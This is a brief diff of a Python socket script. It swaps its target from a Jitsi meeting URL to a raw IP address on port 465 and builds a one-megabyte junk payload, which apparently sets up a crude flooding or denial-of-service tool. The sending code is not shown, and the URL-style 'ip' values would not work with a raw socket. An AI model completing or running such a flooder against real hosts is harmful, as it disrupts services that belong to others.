@@ -1,7 +1,7 @@
 import socket
 
-ip = "https://jitsi.pashmak.net/UnderlyingCriesSwingSideways"
-port = 8080
+ip = "http://5.10.249.41"
+port = 465
 
 payload = b"x" * (1024 * 1024)
 
